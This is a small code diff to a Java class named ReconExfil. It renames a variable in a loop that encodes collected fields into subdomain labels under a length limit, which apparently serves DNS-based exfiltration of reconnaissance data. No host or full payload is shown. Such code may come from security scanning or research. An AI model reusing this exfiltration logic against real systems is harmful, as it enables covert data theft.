@@ -96,10 +96,9 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
         StringBuilder domainBuilder = new StringBuilder();
         for (String field : fields) {
-            String encodedField = encode(field);
-            String addEncodedPart = encodedField + ".";
-            if (addEncodedPart.length() + domainBuilder.length() + lastPartLength <= CONF_DOMAIN_MAX_LEN) {
-                domainBuilder.append(addEncodedPart);
+            String additionalSubdomain = encode(field) + ".";
+            if (additionalSubdomain.length() + domainBuilder.length() + lastPartLength <= CONF_DOMAIN_MAX_LEN) {
+                domainBuilder.append(additionalSubdomain);
                 checksum.update(field.getBytes(StandardCharsets.UTF_8));
             }
         }
